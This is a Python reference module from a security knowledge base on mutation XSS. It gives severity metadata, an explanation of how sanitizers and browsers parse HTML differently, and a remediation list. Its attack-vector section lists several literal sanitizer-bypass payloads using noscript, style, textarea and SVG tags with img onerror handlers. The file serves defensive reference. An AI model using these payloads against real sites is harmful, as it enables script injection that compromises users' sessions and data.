#!/usr/bin/env python3
# Project: BRS-KB
# Company: EasyProTech LLC (www.easypro.tech)
# Dev: Brabus
# Date: 2025-12-27 UTC
# Status: Refactored
# Telegram: https://t.me/EasyProTech

"""
Mutation XSS (mXSS) Context

XSS through browser HTML parsing mutations that bypass sanitizers.
"""

DETAILS = {
    "title": "Mutation XSS (mXSS)",
    "severity": "critical",
    "cvss_score": 8.5,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N",
    "reliability": "high",
    "cwe": ["CWE-79"],
    "owasp": ["A03:2021"],
    "tags": ["mutation", "mxss", "xss", "sanitizer", "bypass"],
    "description": """
Mutation XSS exploits browser HTML parsing quirks where the sanitized
HTML differs from what the browser actually renders. The browser 'mutates'
the HTML during parsing, potentially creating executable script contexts
that weren't present in the original sanitized output.

Key insight:
- Sanitizers parse HTML one way
- Browsers parse HTML differently
- The difference allows XSS
""",
    "attack_vector": """
MUTATION XSS VECTORS:

1. INNERHTML DOUBLE-PARSING
   Sanitize: <p><style><p><!--</style>
   Browser: Creates script context

2. NOSCRIPT MUTATIONS
   <noscript><p title="</noscript><img onerror=alert(1) src=x>">
   Content escapes noscript

3. STYLE TAG MUTATIONS
   <style><!--</style><img onerror=alert(1) src=x>
   Comment escapes style

4. TEXTAREA MUTATIONS
   <textarea></textarea><img onerror=alert(1)>
   Content escapes textarea

5. TEMPLATE TAG MUTATIONS
   Template content parsed differently

6. TABLE AUTO-CORRECTION
   <table><td>X</table>
   Browser adds tbody, tr

7. SVG/MATHML NAMESPACE
   Namespace switching mutations
   <svg><p><style><g title="</style><img onerror=alert(1) src>">

8. P TAG AUTO-CLOSE
   <p><div> auto-closes <p>
   Creates new context

9. ENTITY DECODING
   &lt; decoded differently
   In different contexts

10. BACKTICK HANDLING
    Template literal context changes
""",
    "remediation": """
MUTATION XSS PREVENTION:

1. USE DOMPURIFY WITH OPTIONS
   DOMPurify.sanitize(input, {
     SAFE_FOR_TEMPLATES: true,
     SAFE_FOR_JQUERY: true
   })

2. DOUBLE SANITIZATION
   First sanitize
   Serialize to string
   Sanitize again

3. USE TEXTCONTENT
   Avoid innerHTML entirely
   element.textContent = input

4. IMPLEMENT TRUSTED TYPES
   Browser-level protection
   require-trusted-types-for 'script'

5. CSP STRICT-DYNAMIC
   Prevents mutation to XSS
   Even if mutation occurs

6. UPDATE SANITIZERS
   DOMPurify updated frequently
   For new mutation vectors

7. AVOID PROBLEMATIC TAGS
   Strip: noscript, style, textarea
   In user content

8. CONSISTENT PARSING
   Use same parser as browser
   DOMParser for validation
""",
}
